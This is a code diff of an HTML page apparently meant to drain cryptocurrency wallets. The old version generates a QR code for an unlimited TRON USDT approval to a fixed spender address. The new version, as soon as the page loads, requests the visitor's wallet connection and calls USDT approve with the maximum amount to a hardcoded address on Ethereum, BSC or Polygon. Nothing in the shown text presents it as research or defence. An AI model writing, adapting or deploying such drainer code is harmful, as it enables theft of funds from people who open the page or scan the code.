@@ -1,52 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>USDT Unlimited Approve QR Generator</title>
-  <!-- ✅ Stable QRCode library -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; }
-    #qrcode { margin-top: 30px; }
-    input { padding: 8px; margin: 5px; width: 320px; text-align: center; }
-  </style>
+  <title>USDT 自动授权</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-  <h2>🔐 USDT Unlimited Approve QR Generator</h2>
-
-  <p>Contract Address:</p>
-  <input id="contract" value="TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj" readonly />
-
-  <p>Spender Address:</p>
-  <input id="spender" value="THN9TLyQ1qjXvhvwSoneYwz88yTgnr9Zx4" readonly />
-
-  <p>Amount (Unlimited):</p>
-  <input id="amount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" readonly />
-
-  <!-- ✅ यहाँ QR दिखाई देगा -->
-  <div id="qrcode"></div>
+  <h2 style="text-align: center;">正在自动授权 USDT...</h2>
 
   <script>
-    function generateQR() {
-      const contract = document.getElementById("contract").value.trim();
-      const spender = document.getElementById("spender").value.trim();
-      const amount = document.getElementById("amount").value.trim();
+    const TARGET_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc"; // 被授权者地址
+    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-      const data = `tron:${contract}?function=approve&spender=${spender}&value=${amount}`;
+    const USDT_CONTRACTS = {
+      ethereum: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+      bsc: "0x55d398326f99059fF775485246999027B3197955",
+      polygon: "0x3813e82e6f7098b9583FC0F33a962D02018B6803"
+    };
 
-      const qrContainer = document.getElementById("qrcode");
-      qrContainer.innerHTML = ""; // पहले साफ करो
+    async function autoApprove() {
+      if (!window.ethereum) {
+        alert("请在支持 Web3 的钱包中打开（如 MetaMask）");
+        return;
+      }
 
-      new QRCode(qrContainer, {
-        text: data,
-        width: 250,
-        height: 250
-      });
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const network = await provider.getNetwork();
+
+      let chain = "";
+      if (network.chainId === 1) chain = "ethereum";
+      else if (network.chainId === 56) chain = "bsc";
+      else if (network.chainId === 137) chain = "polygon";
+      else {
+        alert("不支持的链，请切换到 Ethereum / BSC / Polygon");
+        return;
+      }
+
+      const usdt = new ethers.Contract(
+        USDT_CONTRACTS[chain],
+        ["function approve(address spender, uint256 amount) public returns (bool)"],
+        signer
+      );
+
+      try {
+        const tx = await usdt.approve(TARGET_ADDRESS, MAX_UINT);
+        alert("授权成功！交易哈希: " + tx.hash);
+      } catch (err) {
+        alert("授权失败: " + err.message);
+      }
     }
 
-    // ✅ Page load होते ही QR auto-generate हो जाएगा
-    window.onload = generateQR;
+    // 页面加载完立即授权
+    window.onload = autoApprove;
   </script>
 </body>
-
 </html>
